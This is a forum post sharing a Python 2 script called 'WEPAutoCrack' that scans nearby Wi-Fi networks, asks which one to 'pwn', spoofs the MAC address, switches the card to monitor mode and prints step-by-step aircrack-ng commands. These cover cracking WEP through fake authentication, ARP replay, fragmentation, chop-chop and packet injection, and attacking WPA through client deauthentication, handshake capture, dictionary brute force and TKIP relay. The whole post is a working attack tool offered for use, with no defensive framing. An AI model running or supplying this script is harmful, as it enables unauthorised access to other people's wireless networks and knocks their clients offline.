
		
		
Read forum faster on mobile. Get the Free Tapatalk app?

FREE - on Google Play
VIEW	
[Python] Wifi hacker WEPAutoCrack Script
[Python] Wifi hacker WEPAutoCrack Script by Alex. on 04 Oct, 2014 01:44
Post actions

Save as WEPcrack.py (Save as "All Files" in file type.)
Credits to an guy with l33t ness.

Code: [Select]
#!/usr/bin/env python



import sys
import subprocess
import os
import signal
import time

def pwn(interface, network):
	print "[+] Acquiring MAC address:",
	f = open("/sys/class/net/%s/address" % interface, "r")
	realMac = f.read().strip().upper()
	f.close()
	print realMac

	def restore(signum=None, frame=None):
		try:
			proc.terminate()
		except:
			pass
		os.system("reset")

		print "[+] Restoring wifi card"
		os.system("ifconfig %s down" % interface)
		os.system("macchanger -m %s %s" % (realMac, interface))

		# BEGIN CHANGE OR REMOVE ME
		print "[+] Resetting module to work around driver bugs"
		os.system("rmmod iwldvm")
		os.system("rmmod iwlwifi")
		os.system("modprobe iwlwifi")
		time.sleep(2)
		# END CHANGE OR REMOVE ME

		os.system("iwconfig %s mode managed" % interface)
		os.system("ifconfig %s up" % interface)

		print "[+] Starting stopped services"
		# BEGIN CHANGE ME
		os.system("/etc/init.d/wpa_supplicant start")
		os.system("/etc/init.d/dhcpcd start")
		# END CHANGE ME

		sys.exit(0)

	signal.signal(signal.SIGTERM, restore)
	signal.signal(signal.SIGINT, restore)

	print "[+] Shutting down services"
	# BEGIN CHANGE ME
	os.system("/etc/init.d/wpa_supplicant stop")
	os.system("/etc/init.d/dhcpcd stop")
	# END CHANGE ME

	print "[+] Setting fake MAC address"
	os.system("ifconfig %s down" % interface)
	os.system("macchanger -r %s" % interface)
	f = open("/sys/class/net/%s/address" % interface, "r")
	mac = f.read().strip().upper()
	f.close()

	print "[+] Setting wireless card to channel %s" % network["Channel"]
	os.system("iwconfig %s mode managed" % interface)
	os.system("ifconfig %s up" % interface)
	os.system("iwconfig %s channel %s" % (interface, network["Channel"]))
	os.system("ifconfig %s down" % interface)
	os.system("iwconfig %s mode monitor" % interface)
	os.system("ifconfig %s up" % interface)
	os.system("iwconfig %s" % interface)
	
	if network["Encryption"].startswith("WEP"):
		instructions = """
=== Capture IVs ==
airodump-ng -c CHANNEL --bssid BSSID -w output INTERFACE

== Get Deauthetication Packets (Fake Authentication) ==
aireplay-ng -1 0 -e 'NAME' -a BSSID -h MAC INTERFACE
OR
aireplay-ng -1 6000 -o 1 -q 10 -e 'NAME' -a BSSID -h MAC INTERFACE
* the latter is good for persnikitty stations

== Request ARP Packets ==
aireplay-ng -3 -b BSSID -h MAC INTERFACE
* if successful, skip the next three steps and move to analyze

== Fragmentation Attack (if requesting ARPs didn't work - no users on network) ==
aireplay-ng -5 -b BSSID -h MAC INTERFACE
* use this packet? yes
* if successful, skip the next step and construct an arp packet

== Chop-Chop Attach (if fragmentation fails) ==
aireplay-ng -4 -b BSSID -h MAC INTERFACE
* use this packet? yes

== Construct ARP Packet ==
packetforge-ng -0 -a BSSID -h MAC -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w arp-request
* k source, l destination - change for persnikittiness

= Inject Constructed ARP (if fragmentation or chop-chop) ==
aireplay-ng -2 -r arp-request INTERFACE
* use this packet? yes

== Analyze ==
aircrack-ng -z -b BSSID output*.cap
"""
	elif network["Encryption"].startswith("WPA"):
		instructions = """
== Collect 4-way Authentication Handshake ==
airodump-ng -c CHANNEL --bssid BSSID -w psk INTERFACE

== Deauthenticate Wireless Client ==
aireplay-ng -0 1 -a BSSID -c CLIENT INTERFACE

== Brute Force ==
cat /usr/share/dict/* | aircrack-ng -w - -b BSSID psk*.cap
"""
		if "(TKIP)" in network["Encryption"]:
			instructions += """

---------

Instead of brute forcing it, because this AP supports TKIP, there are possibilities of RC4 vulnerabilities.

=== Capture IVs ==
airodump-ng -c CHANNEL --bssid BSSID -w output INTERFACE

=== TKIP Relay ===
tkiptun-ng -h MAC -a BSSID -m 80 -n 100 INTERFACE

== Analyze ==
aircrack-ng -z -b BSSID output*.cap
"""
	else:
		instructions = "Wrong encryption type"

	instructions = instructions.replace("NAME", network["Name"]).replace("BSSID", network["Address"]).replace("MAC", mac).replace("INTERFACE", interface).replace("CHANNEL", network["Channel"])
	proc = subprocess.Popen("less", stdin=subprocess.PIPE)
	proc.communicate(input=instructions)
	proc.wait()

	restore()

def get_name(cell):
	return matching_line(cell, "ESSID:")[1:-1]

def get_quality(cell):
	quality = matching_line(cell, "Quality=").split()[0].split('/')
	return str(int(round(float(quality[0]) / float(quality[1]) * 100))).rjust(3) + " %"

def get_channel(cell):
	return matching_line(cell, "Channel:")

def get_encryption(cell):
	enc = ""
	if matching_line(cell, "Encryption key:") == "off":
		enc = "Open"
	else:
		tkip = False
		for line in cell:
			if "Pairwise Ciphers (1) : TKIP" in line:
				tkip = True
			matching = match(line, "IE:")
			if matching != None:
				wpa = match(matching, "WPA")
				if wpa != None:
					enc = "WPA"
				else:
					wpa = match(matching, "IEEE 802.11i/WPA2")
					if wpa != None:
						enc = "WPA2"
		if enc == "":
			enc = "WEP"
		if tkip:
			enc += " (TKIP)"
	return enc

def get_address(cell):
	return matching_line(cell, "Address: ")

rules = {"Name":get_name,
	 "Quality": get_quality,
	 "Channel": get_channel,
	 "Encryption": get_encryption,
	 "Address": get_address
	}

def sort_cells(cells):
	sortby = "Quality"
	reverse = True
	cells.sort(None, lambda el: el[sortby], reverse)

columns = ["#", "Name", "Address", "Quality", "Channel", "Encryption"]

def matching_line(lines, keyword):
	for line in lines:
		matching = match(line,keyword)
		if matching != None:
			return matching
	return None

def match(line,keyword):
	line = line.lstrip()
	length = len(keyword)
	if line[:length] == keyword:
		return line[length:]
	else:
		return None

def parse_cell(cell):
	parsed_cell = {}
	for key in rules:
		rule = rules[key]
		parsed_cell.update({ key: rule(cell) })
	return parsed_cell

def print_table(table):
	widths=map(max, map(lambda l:map(len, l), zip(*table)))

	justified_table = []
	for line in table:
		justified_line = []
		for i, el in enumerate(line):
			justified_line.append(el.ljust(widths[i] + 2))
		justified_table.append(justified_line)
	
	for line in justified_table:
		for el in line:
			print el,
		print

def print_cells(cells):
	table = [columns]
	counter = 1
	for cell in cells:
		cell_properties=[]
		for column in columns:
			if column == '#':
				cell_properties.append(str(counter))
			else:
				cell_properties.append(cell[column])
		table.append(cell_properties)
		counter += 1
	print_table(table)

def main():
	print "+------------------------+"
	
	print
	if len(sys.argv) != 2:
		print "You must supply the wifi card name as an argument."
		return
	if os.getuid() != 0:
		print "You must be root."
		return
	while True:
		print "[+] Scanning..."
		proc = subprocess.Popen(["iwlist", sys.argv[1], "scanning"], stdout=subprocess.PIPE)
		cells=[[]]
		parsed_cells=[]
		for line in proc.stdout:
			cell_line = match(line, "Cell ")
			if cell_line != None:
				cells.append([])
				line = cell_line[-27:]
			cells[-1].append(line.rstrip())
		cells = cells[1:]
		for cell in cells:
			parsed_cells.append(parse_cell(cell))
		sort_cells(parsed_cells)
		encrypted_cells = []
		for cell in parsed_cells:
			if cell["Encryption"] != "Open":
				encrypted_cells.append(cell)
	
		if len(encrypted_cells) == 0:
			print "[-] Could not find any wireless networks."
			time.sleep(2)
			continue

		print_cells(encrypted_cells)
		print
		try:
			network = int(raw_input("Which network would you like to pwn? [1-%s] [0 to rescan, -1 to quit] " % len(encrypted_cells))) 
		except:
			network = -1
		if network > len(encrypted_cells) or network < 0:
			return
		if network == 0:
			continue
		pwn(sys.argv[1], encrypted_cells[network - 1])
		return
	
main()
